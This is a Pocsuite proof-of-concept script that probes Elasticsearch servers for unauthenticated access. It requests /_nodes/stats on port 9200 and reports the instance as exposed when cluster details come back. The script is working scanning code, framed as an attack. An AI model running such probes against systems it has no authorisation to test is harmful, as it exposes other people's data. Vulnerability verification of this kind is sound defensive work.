# -*- coding:utf-8 -*-
# checked
import urlparse

from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = 'ssvid-62520'
    version = '1'
    author = ['Anonymous']
    vulDate = '2015-10-26'
    createDate = '2015-10-26'
    updateDate = '2015-10-26'
    references = ['']
    name = 'Elasticsearch 信息泄漏'
    appPowerLink = 'http://www.elasticsearch.org/'
    appName = 'Elasticsearch'
    appVersion = 'All'
    vulType = 'Information Disclosure'
    desc = '''
        默认情况，Elasticsearch开启后会监听 9200 端口,可以在未授权的情况下访问，从而导致敏感信息泄漏
    '''

    samples = ['']
    install_require = ['urlparse']

    def _verify(self):
        result = {}
        payload = '/_nodes/stats'

        scheme, netloc, path, params, query, fragment = urlparse.urlparse(self.url)

        if ':' in netloc:
            host, port = netloc.split(':')
            attack_host = 'http://' + host + ':' + port
        else:
            attack_host = 'http://' + netloc + ':' + '9200'

        attack_url = attack_host + payload
        resp = req.get(attack_url)

        if resp and '\"cluster_name\"' in resp.content and '\"transport_address\":' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = attack_url
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
